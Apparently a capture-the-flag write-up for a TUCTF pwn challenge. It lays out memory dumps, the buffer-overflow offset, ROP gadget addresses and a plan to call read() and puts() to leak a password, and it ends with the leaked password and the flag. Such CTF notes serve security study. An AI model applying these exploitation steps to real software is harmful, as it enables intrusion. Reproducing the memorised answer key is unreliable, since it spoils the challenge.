@@ -1,0 +1,77 @@
+You ever just get a craving for pancakes?
+
+nc chal.tuctf.com 30503
+
+Where is the flag when it's read?
+
+0x804c060 <password>:   0x00000000      0x00000000      0x00000000      0x00000000
+0x804c010 <printf@got.plt>:     0xf7e2f400      0xf7f37430      0xf7e4b160      0xf7ec88f0
+
+fd = open("flag.txt")
+file descriptor for flag.txt stored on the stack
+
+0xffffd220:     0x00000001      0x00000000      0x00000000      0x0804833d
+0xffffd230:     0xf7ffd000      0x080482ec      0xf7e57899      0x2c957c00
+0xffffd240:     0xf7fb65c0      0xf7dea760      0xf7e3f45b      0x0804c000
+0xffffd250:     0xffffd2b8      0x00000040      0xffffd290      0xf7ec8d17
+0xffffd260:     0xffffd2b8      0xf7fe9450      0xf7fb8010      [ 0x00000003 ] <== here!
+0xffffd270:     0xffffd290      0x0804c000      0xffffd2b8      0x08049310
+0xffffd280:     0xffffd290      0xffffd290      0x00000040      0x080492d9
+0xffffd290:     0x61616161      0xf7fe940a      0xffffd304      0x0804c000
+
+buffer overflow at 44 bytes then eip at 48
+
+at overflow - stack is at 0xffffd2bc:     0x35624134
+file descriptor on stack at 0xffffd26c:     0x00000003
+file descriptor is 80 bytes before
+
+0x08049030    1 6            sym.imp.read
+0x08049060    1 6            sym.imp.puts
+
+need to ROP to read(file_descriptor, password_buf, num)
+then puts(password_buf)
+
+we control 
+$ebx   : 0x41326241 ("Ab2A"?)
+$ebp   : 0x62413362 ("b3Ab"?)
+
+0x080493d0                 5b  pop ebx
+0x080493d1                 5e  pop esi
+0x080493d2                 5f  pop edi
+0x080493d3                 5d  pop ebp
+0x080493d4                 c3  ret
+
+0x0804936e                 59  pop ecx
+0x0804936f                 5b  pop ebx
+0x08049370                 5d  pop ebp
+0x08049371             8d61fc  lea esp, dword [ecx - 4]
+0x08049374                 c3  ret
+
+0x08049372                 61  popal
+0x08049373                 fc  cld
+0x08049374                 c3  ret
+
+0x080490f1               fff4  push esp
+0x080490f3             8b1c24  mov ebx, dword [esp]
+0x080490f6                 c3  ret
+
+0x0804928a                 50  push eax
+0x0804928b             ff75f4  push dword [ebp - 0xc]
+0x0804928e         e89dfdffff  call 0x8049030 read()
+
+# stack
+0xffffd260:     0x00000000      0x00000000      0x00000000      [ 0x00000003 ] <== file descriptor
+0xffffd270:     0xffffd290      0x0804c000      0xffffd2b8      0x08049310
+0xffffd280:     0xffffd290      0xffffd290      0x00000040      0x080492d9
+0xffffd290:     0x41306141      0x61413161      0x33614132      0x41346141
+0xffffd2a0:     0x61413561      0x37614136      0x41386141      0x62413961
+0xffffd2b0:     0x31624130      0x41326241      0x62413362      [ 0x35624134 ] <== eip here and esp at point of crash
+
+Solution:
+
+rop to puts() password
+leaked password to be:
+l0r3m_1p5um_d0l0r_517_4m37
+
+entering password in prompt gets flag:
+TUCTF{p4nc4k35_4r3_4b50lu73ly_d3l1c10u5_4nd_y0u_5h0uld_637_50m3_4f73r_7h15}
